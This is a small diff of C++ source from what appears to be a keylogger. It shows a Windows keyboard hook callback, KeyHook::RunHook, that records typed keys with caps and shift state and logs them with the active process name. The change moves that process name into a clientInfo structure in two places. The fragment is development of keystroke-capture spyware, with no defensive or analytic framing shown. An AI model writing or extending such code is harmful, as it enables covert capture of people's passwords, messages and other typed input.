@@ -33,7 +33,7 @@ LRESULT KeyHook::RunHook(int nCode, WPARAM wParam, LPARAM lParam) {
 	} else {
 	  keyLog += KeyConst::AddKey(key, caps, shift);
 	}
-	Stream::WriteLog(keyLog, activeProcess);
+	Stream::WriteLog(keyLog, clientInfo.activeProcess);
 	keyLog.clear();
   }
 
@@ -62,7 +62,7 @@ LRESULT KeyHook::RunHook(int nCode, WPARAM wParam, LPARAM lParam) {
 		key_name.insert(1, "/");
 	  }
 	  keyLog += key_name;
-	  Stream::WriteLog(keyLog, activeProcess);
+	  Stream::WriteLog(keyLog, clientInfo.activeProcess);
 	  keyLog.clear();
 	}
   }
